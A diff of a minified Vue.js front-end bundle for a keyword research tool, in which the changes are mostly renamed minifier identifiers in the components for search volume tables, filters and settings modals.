+            }, null, 8, Wq)]), r.current_permissions.show_cpc_data ? (b(), g("div", Vq, [r.summaries.average_cpc_format ? (b(), g("div", Hq, v(r.summaries.average_cpc_format), 1)) : (b(), g("div", Iq, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Sorry, Bing does not provide data for these keywords at the moment."),
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Nq)]))])) : (b(), g("div", Rq, "8.88"))])) : T("", !0)])) : T("", !0), S("div", Kq, [r.current_permissions.show_competition_column ? (b(), g("div", Jq, [S("div", Wq, [P(v(e.trans.get("Average Competition")) + " ", 1), S("i", {
+            }, "-", 8, Nq)]))])) : (b(), g("div", Bq, "8.88"))])) : T("", !0)])) : T("", !0), S("div", Rq, [r.current_permissions.show_competition_column ? (b(), g("div", Kq, [S("div", Jq, [P(v(e.trans.get("Average Competition")) + " ", 1), S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Average Competition is the average of Competition values for keywords that were found."),
                 "data-bs-toggle": "popover-sv-summary",
@@ -15709,23 +15720,23 @@ const lE = Ue(ZF, [
     PE = {
         class: "table-head"
     },
-    LE = {
+    $E = {
         key: 1,
         class: "col-language"
     },
-    BE = {
+    LE = {
         key: 0
     },
-    $E = {
+    DE = {
         key: 0
     },
-    DE = [S("i", {
+    jE = [S("i", {
         class: "bi bi-arrow-up"
     }, null, -1)],
     OE = {
         key: 1
     },
-    jE = [S("i", {
+    WE = [S("i", {
         class: "bi bi-arrow-down"
     }, null, -1)],
     VE = {
@@ -15741,16 +15752,16 @@ const lE = Ue(ZF, [
     NE = {
         key: 0
     },
-    RE = [S("i", {
+    BE = [S("i", {
         class: "bi bi-arrow-up"
     }, null, -1)],
-    KE = {
+    RE = {
         key: 1
     },
-    JE = [S("i", {
+    KE = [S("i", {
         class: "bi bi-arrow-down"
     }, null, -1)],
-    WE = {
+    JE = {
         class: "table-head"
     },
     zE = {
@@ -15871,22 +15882,22 @@ const lE = Ue(ZF, [
     PU = {
         key: 0
     },
-    LU = [S("i", {
+    $U = [S("i", {
         class: "bi bi-arrow-up"
     }, null, -1)],
-    BU = {
+    LU = {
         key: 1
     },
-    $U = [S("i", {
+    DU = [S("i", {
         class: "bi bi-arrow-down"
     }, null, -1)],
-    DU = {
+    jU = {
         class: "table-head"
     },
     OU = {
         key: 0
     },
-    jU = {
+    WU = {
         key: 0,
         class: "w-0 p-0 m-0"
     },
@@ -15901,16 +15912,16 @@ const lE = Ue(ZF, [
     NU = {
         class: "alert-pro-upsell alert-pro-upsell-keyword-results position-absolute w-100"
     },
-    RU = {
+    BU = {
         class: "card mt-2 pb-2 text-center shadow"
     },
-    KU = {
+    RU = {
         class: "card-body"
     },
-    JU = S("h4", {
+    KU = S("h4", {
         class: "card-title"
     }, " 🚀 Keyword Tool Pro ", -1),
-    WU = {
+    JU = {
         class: "card-text lead fw-normal"
     },
     zU = ["innerHTML"],
@@ -16031,18 +16042,18 @@ const lE = Ue(ZF, [
         key: 1,
         class: "text-blur"
     },
-    LM = {
+    $M = {
         key: 1
     },
-    BM = {
+    LM = {
         key: 4,
         class: "col-trend d-none d-md-table-cell"
     },
-    $M = {
+    DM = {
         key: 0,
         class: "text-nowrap"
     },
-    DM = {
+    jM = {
         key: 0,
         class: "bi bi-arrow-up"
     },
@@ -16050,7 +16061,7 @@ const lE = Ue(ZF, [
         key: 1,
         class: "bi bi-arrow-down"
     },
-    jM = {
+    WM = {
         key: 1,
         class: "text-secondary"
     },
@@ -16066,17 +16077,17 @@ const lE = Ue(ZF, [
     NM = {
         key: 0
     },
-    RM = {
+    BM = {
         key: 1,
         class: "text-blur"
     },
-    KM = {
+    RM = {
         key: 1
     },
-    JM = {
+    KM = {
         class: "col-trend-chart py-0 d-none d-md-table-cell"
     },
-    WM = {
+    JM = {
         key: 5,
         class: "col-average-cpc d-none d-md-table-cell"
     },
@@ -16207,13 +16218,13 @@ const yA = Ue(cE, [
             }, null, 8, TE))])) : T("", !0)]), r.current_permissions.show_location_column ? (b(), g("th", FE, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[3] || (t[3] = e => r.current_permissions.show_location_data ? o.sort("location") : "")
-            }, ["location" == r.sort_by ? (b(), g("span", qE, ["Asc" == r.sort_direction ? (b(), g("span", EE, UE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", ME, AE)) : T("", !0)])) : T("", !0), S("span", PE, v(e.trans.get("Location")), 1)])])) : T("", !0), r.current_permissions.show_language_column ? (b(), g("th", LE, [S("span", {
+            }, ["location" == r.sort_by ? (b(), g("span", qE, ["Asc" == r.sort_direction ? (b(), g("span", EE, UE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", ME, AE)) : T("", !0)])) : T("", !0), S("span", PE, v(e.trans.get("Location")), 1)])])) : T("", !0), r.current_permissions.show_language_column ? (b(), g("th", $E, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[4] || (t[4] = e => r.current_permissions.show_language_data ? o.sort("language") : "")
-            }, ["language" == r.sort_by ? (b(), g("span", BE, ["Asc" == r.sort_direction ? (b(), g("span", $E, DE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", OE, jE)) : T("", !0)])) : T("", !0), S("span", VE, v(e.trans.get("Language")), 1)])])) : T("", !0), r.current_permissions.show_network_column ? (b(), g("th", HE, [S("span", {
+            }, ["language" == r.sort_by ? (b(), g("span", LE, ["Asc" == r.sort_direction ? (b(), g("span", DE, jE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", OE, WE)) : T("", !0)])) : T("", !0), S("span", VE, v(e.trans.get("Language")), 1)])])) : T("", !0), r.current_permissions.show_network_column ? (b(), g("th", HE, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[5] || (t[5] = e => r.current_permissions.show_network_data ? o.sort("network") : "")
-            }, ["network" == r.sort_by ? (b(), g("span", IE, ["Asc" == r.sort_direction ? (b(), g("span", NE, RE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", KE, JE)) : T("", !0)])) : T("", !0), S("span", WE, v(e.trans.get("Network")), 1)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", zE, [S("span", {
+            }, ["network" == r.sort_by ? (b(), g("span", IE, ["Asc" == r.sort_direction ? (b(), g("span", NE, BE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", RE, KE)) : T("", !0)])) : T("", !0), S("span", JE, v(e.trans.get("Network")), 1)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", zE, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[6] || (t[6] = e => r.current_permissions.show_search_volume_data ? o.sort("searchVolume") : "")
             }, [r.current_permissions.show_search_volume_data ? (b(), g("span", YE, ["searchVolume" == r.sort_by ? (b(), g("span", GE, ["Asc" == r.sort_direction ? (b(), g("span", XE, QE)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", ZE, eU)) : T("", !0)])) : T("", !0)])) : T("", !0), S("span", tU, v(e.trans.get("Search Volume")), 1)]), S("span", null, [S("i", {
@@ -16256,12 +16267,12 @@ const yA = Ue(cE, [
             }, null, 8, UU)])])) : T("", !0), r.current_permissions.show_timestamp_column ? (b(), g("th", MU, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[10] || (t[10] = e => r.current_permissions.show_timestamp_data ? o.sort("timestamp") : "")
-            }, ["timestamp" == r.sort_by ? (b(), g("span", AU, ["Asc" == r.sort_direction ? (b(), g("span", PU, LU)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", BU, $U)) : T("", !0)])) : T("", !0), S("span", DU, v(e.trans.get("Last Updated")), 1)])])) : T("", !0)])]), r.keywords.length ? (b(), g("tbody", OU, [(b(!0), g(y, null, w(r.keywords, ((s, l) => (b(), g(y, {
+            }, ["timestamp" == r.sort_by ? (b(), g("span", AU, ["Asc" == r.sort_direction ? (b(), g("span", PU, $U)) : T("", !0), "Desc" == r.sort_direction ? (b(), g("span", LU, DU)) : T("", !0)])) : T("", !0), S("span", jU, v(e.trans.get("Last Updated")), 1)])])) : T("", !0)])]), r.keywords.length ? (b(), g("tbody", OU, [(b(!0), g(y, null, w(r.keywords, ((s, l) => (b(), g(y, {
                 key: l
-            }, [r.show_upsell && r.keywords.length >= r.current_free_results + 5 && l == r.current_free_results && !r.current_permissions.show_search_volume_data && (1 == r.current_tab || 6 == r.current_tab || 3 == r.current_tab || 7 == r.current_tab || 8 == r.current_tab || 9 == r.current_tab || 12 == r.current_tab) ? (b(), g("tr", jU, [VU, S("td", {
+            }, [r.show_upsell && r.keywords.length >= r.current_free_results + 5 && l == r.current_free_results && !r.current_permissions.show_search_volume_data && (1 == r.current_tab || 6 == r.current_tab || 3 == r.current_tab || 7 == r.current_tab || 8 == r.current_tab || 9 == r.current_tab || 12 == r.current_tab) ? (b(), g("tr", WU, [VU, S("td", {
                 class: "w-0 p-0 m-0 border-0",
                 colspan: o.getColspan()
-            }, [S("div", IU, [S("div", NU, [S("div", RU, [S("div", KU, [JU, S("div", WU, [S("p", {
+            }, [S("div", IU, [S("div", NU, [S("div", BU, [S("div", RU, [KU, S("div", JU, [S("p", {
                 class: "mb-0",
                 innerHTML: e.trans.get("Do you need this information?")
             }, null, 8, zU), S("p", {
@@ -16365,17 +16376,17 @@ const yA = Ue(cE, [
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", AM, "...")) : (b(), g("span", PM, "88,888"))], 64)) : (b(), g("span", LM, "..."))], 64))])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("td", BM, [r.has_metrics && void 0 !== s.search_volume_trend ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", AM, "...")) : (b(), g("span", PM, "88,888"))], 64)) : (b(), g("span", $M, "..."))], 64))])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("td", LM, [r.has_metrics && void 0 !== s.search_volume_trend ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_search_volume_data || l >= r.current_free_results && r.current_permissions.free_user_show_trends_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
-            }, ["" !== s.search_volume_trend && null !== s.search_volume_trend ? (b(), g("span", $M, [S("span", {
+            }, ["" !== s.search_volume_trend && null !== s.search_volume_trend ? (b(), g("span", DM, [S("span", {
                 class: f({
                     "text-success": s.search_volume_trend > 0,
                     "text-danger": s.search_volume_trend < 0,
                     icon: 0 == s.search_volume_trend
                 })
-            }, [s.search_volume_trend > 0 ? (b(), g("i", DM)) : s.search_volume_trend < 0 ? (b(), g("i", OM)) : T("", !0), P(" " + v(s.search_volume_trend_format), 1)], 2)])) : (b(), g("span", jM, [r.current_permissions.free_user_show_trends_data ? (b(), g("span", VM, "88%")) : (b(), g("span", {
+            }, [s.search_volume_trend > 0 ? (b(), g("i", jM)) : s.search_volume_trend < 0 ? (b(), g("i", OM)) : T("", !0), P(" " + v(s.search_volume_trend_format), 1)], 2)])) : (b(), g("span", WM, [r.current_permissions.free_user_show_trends_data ? (b(), g("span", VM, "88%")) : (b(), g("span", {
                 key: 1,
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
@@ -16386,7 +16397,7 @@ const yA = Ue(cE, [
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", NM, "...")) : (b(), g("span", RM, "88%"))], 64)) : (b(), g("span", KM, "..."))], 64))])) : T("", !0), S("td", JM, [(r.current_permissions.show_search_volume_data || l < r.current_free_results && !s.has_null) && "" !== s.search_volume_trend && null !== s.search_volume_trend ? (b(), x(n, {
+            }, [r.user_is_paid ? (b(), g("span", NM, "...")) : (b(), g("span", BM, "88%"))], 64)) : (b(), g("span", RM, "..."))], 64))])) : T("", !0), S("td", KM, [(r.current_permissions.show_search_volume_data || l < r.current_free_results && !s.has_null) && "" !== s.search_volume_trend && null !== s.search_volume_trend ? (b(), x(n, {
                 key: 0,
                 data: s.search_volume_trend_mini_chart,
                 keyword_id: s.id,
@@ -16397,7 +16408,7 @@ const yA = Ue(cE, [
                     title: s.search_volume_trend_title,
                     width: 600
                 }
-            }, null, 8, ["data", "keyword_id", "popup"])) : T("", !0)]), r.current_permissions.show_cpc_column ? (b(), g("td", WM, [r.has_metrics && void 0 !== s.average_cpc ? (b(), g(y, {
+            }, null, 8, ["data", "keyword_id", "popup"])) : T("", !0)]), r.current_permissions.show_cpc_column ? (b(), g("td", JM, [r.has_metrics && void 0 !== s.average_cpc ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_cpc_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
@@ -16580,24 +16591,24 @@ const yA = Ue(cE, [
     PA = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    LA = {
+    $A = {
         key: 1,
         class: "row"
     },
-    BA = {
-        class: "col-12 col-md-6"
-    },
-    $A = {
+    LA = {
         class: "col-12 col-md-6"
     },
     DA = {
+        class: "col-12 col-md-6"
+    },
+    jA = {
         key: 0,
         class: "search-results-settings-modal-competition mb-3"
     },
     OA = {
         class: "form-label search-results-settings-modal-competition-label"
     },
-    jA = {
+    WA = {
         class: "search-results-settings-modal-competition-value form-check"
     },
     VA = {
@@ -16614,17 +16625,17 @@ const yA = Ue(cE, [
     NA = {
         class: "search-results-settings-modal-competition-value form-check"
     },
-    RA = {
+    BA = {
         for: "high",
         class: "search-results-settings-modal-competition-label fw-normal form-check-label"
     },
-    KA = {
+    RA = {
         class: "row"
     },
-    JA = {
+    KA = {
         class: "col-12"
     },
-    WA = {
+    JA = {
         class: "row"
     },
     zA = {
@@ -16675,19 +16686,19 @@ const aP = Ue(wA, [
                 M = k("search-results-settings-filter-positive-keywords"),
                 A = k("search-results-settings-filter-negative-keywords"),
                 P = k("alert-pro-upsell"),
-                L = k("search-results-settings-admin-settings"),
-                $ = k("search-results-settings-modal"),
-                D = k("search-results-tabs"),
+                $ = k("search-results-settings-admin-settings"),
+                D = k("search-results-settings-modal"),
+                j = k("search-results-tabs"),
                 O = k("has-error"),
-                j = k("suggest-page-reload"),
+                W = k("suggest-page-reload"),
                 V = k("bing-search-volume-summary"),
                 H = k("show-upsell"),
                 I = k("bing-search-volume-result"),
                 N = k("search-results-table-wrapper"),
-                R = k("search-results-no-keyword-found"),
-                K = k("has-more"),
-                J = k("dropdown-menu-item-add-basket"),
-                W = k("dropdown-menu-item-divider"),
+                B = k("search-results-no-keyword-found"),
+                R = k("has-more"),
+                K = k("dropdown-menu-item-add-basket"),
+                J = k("dropdown-menu-item-divider"),
                 z = k("dropdown-menu-item-export-excel"),
                 Y = k("dropdown-menu-item-export-csv"),
                 G = k("dropdown-menu-item-copy-keywords"),
@@ -16732,7 +16743,7 @@ const aP = Ue(wA, [
                 show_current_split_negative_keywords: e.show_current_split_negative_keywords,
                 show_display_filter_negative_keywords: e.show_display_filter_negative_keywords,
                 onClearFilter: e.clearFilter
-            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E($, {
+            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E(D, {
                 onResetFilter: e.resetFilter,
                 onApplyFilter: e.applyFilter,
                 filter_counter: e.filter_counter,
@@ -16757,7 +16768,7 @@ const aP = Ue(wA, [
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])], 64)) : T("", !0), S("div", MA, [S("div", AA, [S("h5", PA, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", LA, [S("div", BA, [E(w, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])], 64)) : T("", !0), S("div", MA, [S("div", AA, [S("h5", PA, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", $A, [S("div", LA, [E(w, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -16773,7 +16784,7 @@ const aP = Ue(wA, [
                     "onUpdate:current_filter_search_volume_trend_min": t[5] || (t[5] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[6] || (t[6] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", $A, [E(U, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", DA, [E(U, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -16781,7 +16792,7 @@ const aP = Ue(wA, [
                     "onUpdate:current_filter_average_cpc_min": t[7] || (t[7] = t => e.current_filter_average_cpc_min = t),
                     current_filter_average_cpc_max: e.current_filter_average_cpc_max,
                     "onUpdate:current_filter_average_cpc_max": t[8] || (t[8] = t => e.current_filter_average_cpc_max = t)
-                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_data ? (b(), g("div", DA, [S("label", OA, v(e.trans.get("Competition")), 1), S("div", jA, [F(S("input", {
+                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_data ? (b(), g("div", jA, [S("label", OA, v(e.trans.get("Competition")), 1), S("div", WA, [F(S("input", {
                     type: "checkbox",
                     class: "form-check-input",
                     id: "low",
@@ -16808,7 +16819,7 @@ const aP = Ue(wA, [
                     "onUpdate:modelValue": t[11] || (t[11] = t => e.current_filter_competition = t)
                 }, null, 512), [
                     [q, e.current_filter_competition]
-                ]), S("label", RA, v(e.trans.get("High")), 1)])])) : T("", !0)])])) : T("", !0), S("div", KA, [S("div", JA, [E(M, {
+                ]), S("label", BA, v(e.trans.get("High")), 1)])])) : T("", !0)])])) : T("", !0), S("div", RA, [S("div", KA, [E(M, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -16817,7 +16828,7 @@ const aP = Ue(wA, [
                     "onUpdate:current_filter_keywords": t[12] || (t[12] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[13] || (t[13] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", WA, [S("div", zA, [E(A, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", JA, [S("div", zA, [E(A, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -16838,7 +16849,7 @@ const aP = Ue(wA, [
                         })
                     }, null, 8, GA)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(L, {
+                }, 8, ["current_permissions", "routes"]), E($, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[15] || (t[15] = t => e.current_filter_keyword_result_period = t),
@@ -16850,7 +16861,7 @@ const aP = Ue(wA, [
                     reset_all_metrics_url: e.current_reset_all_metrics_url
                 }, null, 8, ["current_permissions", "current_filter_keyword_result_period", "current_keyword_result_periods", "search_engine", "current_tab", "reset_keywords_url", "reset_latest_metrics_url", "reset_all_metrics_url"])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(D, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(j, {
                 onApplyTab: o.applyTab,
                 tabs: e.tabs,
                 current_tab: e.current_tab,
@@ -16861,7 +16872,7 @@ const aP = Ue(wA, [
                 has_metrics: e.has_metrics,
                 onFetch: o.fetch,
                 current_tab: e.current_tab
-            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(j, {
+            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(W, {
                 suggest_page_reload: e.suggest_page_reload
             }, null, 8, ["suggest_page_reload"]), F(S("div", XA, [S("div", QA, [E(V, {
                 loading: e.loading,
@@ -16876,7 +16887,7 @@ const aP = Ue(wA, [
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
             ]), S("div", ZA, [E(N, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
@@ -16912,7 +16923,7 @@ const aP = Ue(wA, [
                     user_is_paid: e.user_is_paid
                 }, null, 8, ["device_breakdown_data", "loading", "current_tab", "current_permissions", "show_upsell", "upsell_message", "keywords", "all_keywords", "onSort", "sort_by", "sort_direction", "allow_keyword_basket", "add_basket", "search_engine", "keyword", "has_metrics", "current_metrics_currency", "onAll", "onSelect", "onDeselect", "selected_language_name", "current_free_results", "routes", "search_engine_name", "user_is_paid"])])),
                 _: 1
-            }, 8, ["loading", "has_keywords", "has_metrics"]), E(R, {
+            }, 8, ["loading", "has_keywords", "has_metrics"]), E(B, {
                 loading: e.loading,
                 has_all_error: e.has_all_error,
                 has_error: e.has_error,
@@ -16921,7 +16932,7 @@ const aP = Ue(wA, [
             }, {
                 message: C((() => [6 == e.current_tab ? (b(), g("h4", eP, v(e.trans.get("Sorry, Bing does not provide any prepositions for your query")), 1)) : 3 == e.current_tab ? (b(), g("h4", tP, v(e.trans.get("Sorry, Bing does not provide any questions for your query")), 1)) : 2 == e.current_tab ? (b(), g("h4", rP, v(e.trans.get("Sorry, Bing does not provide any related keywords for your query")), 1)) : (b(), g("h4", sP, v(e.trans.get("Sorry, Bing does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
-            }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(K, {
+            }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(R, {
                 onMore: e.more,
                 has_more: e.has_more,
                 has_all_error: e.has_all_error,
@@ -16937,16 +16948,16 @@ const aP = Ue(wA, [
                 has_error: e.has_error,
                 has_all_error: e.has_all_error
             }, {
-                "dropdown-menu-item": C((() => [e.allow_keyword_basket ? (b(), x(J, {
+                "dropdown-menu-item": C((() => [e.allow_keyword_basket ? (b(), x(K, {
                     key: 0,
                     onAdd_basket: e.add_basket
-                }, null, 8, ["onAdd_basket"])) : T("", !0), e.allow_keyword_basket ? (b(), x(W, {
+                }, null, 8, ["onAdd_basket"])) : T("", !0), e.allow_keyword_basket ? (b(), x(J, {
                     key: 1
                 })) : T("", !0), E(z, {
                     onExcel: e.excel
                 }, null, 8, ["onExcel"]), E(Y, {
                     onExcel: e.excel
-                }, null, 8, ["onExcel"]), E(W), E(G, {
+                }, null, 8, ["onExcel"]), E(J), E(G, {
                     onCopy: e.copy
                 }, null, 8, ["onCopy"]), E(X, {
                     onCopy: e.copy,
@@ -16969,7 +16980,7 @@ const aP = Ue(wA, [
         class: "col col-md-5 my-1 me-lg-n1px"
     };
 const lP = Ue({
-        mixins: [DT],
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/bing/languages",
@@ -17074,7 +17085,7 @@ const lP = Ue({
         class: "form-label check-search-volume-settings-network-label"
     };
 const MP = Ue({
-        mixins: [$T, IT],
+        mixins: [DT, IT],
         data: () => ({
             locations_settings: {},
             locations_limit: 10,
@@ -17200,24 +17211,24 @@ const MP = Ue({
     PP = {
         class: "search-results-settings-display mx-n1"
     },
-    LP = {
+    $P = {
         key: 0,
         class: "row"
     },
-    BP = {
+    LP = {
         class: "col"
     },
-    $P = {
+    DP = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    DP = {
+    jP = {
         key: 1,
         class: "row"
     },
     OP = {
         class: "col-12 col-md-6"
     },
-    jP = {
+    WP = {
         class: "search-results-settings-modal-country mb-3"
     },
     VP = {
@@ -17231,18 +17242,18 @@ const MP = Ue({
     NP = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    RP = {
+    BP = {
         class: "form-label search-results-settings-modal-currency-label"
     },
-    KP = {
+    RP = {
         key: 2,
         class: "row"
     },
-    JP = {
+    KP = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    WP = {
+    JP = {
         key: 1,
         class: "col-12 col-md-6"
     },
@@ -17265,42 +17276,42 @@ const MP = Ue({
     ZP = {
         class: "col-12 col-md-6"
     },
-    eL = {
+    e$ = {
         class: "row"
     },
-    tL = {
+    t$ = {
         class: "col-12"
     },
-    rL = {
+    r$ = {
         class: "row"
     },
-    sL = {
+    s$ = {
         class: "col-12"
     },
-    aL = ["innerHTML"],
-    oL = ["innerHTML"],
-    iL = {
+    a$ = ["innerHTML"],
+    o$ = ["innerHTML"],
+    i$ = {
         class: "search-results-summary card my-4 bg-light"
     },
-    nL = {
+    n$ = {
         class: "card-body"
     },
-    lL = {
+    l$ = {
         class: "search-results-keywords my-3"
     },
-    cL = {
+    c$ = {
         key: 0,
         class: "mb-4"
     },
-    _L = {
+    _$ = {
         key: 1,
         class: "mb-4"
     };
-const uL = Ue({
+const u$ = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -17400,19 +17411,19 @@ const uL = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -17477,24 +17488,24 @@ const uL = Ue({
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", LP, [S("div", BP, [S("h5", $P, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", DP, [S("div", OP, [S("div", jP, [S("label", VP, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", $P, [S("div", LP, [S("h5", DP, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", jP, [S("div", OP, [S("div", WP, [S("label", VP, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, HP)])]), e.current_permissions.show_currency_settings ? (b(), g("div", IP, [S("div", NP, [S("label", RP, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, HP)])]), e.current_permissions.show_currency_settings ? (b(), g("div", IP, [S("div", NP, [S("label", BP, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", KP, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", JP, [E(f, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", RP, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", KP, [E(f, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", WP, [E(q, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", JP, [E(q, {
                     current_currency_list: e.current_currency_list,
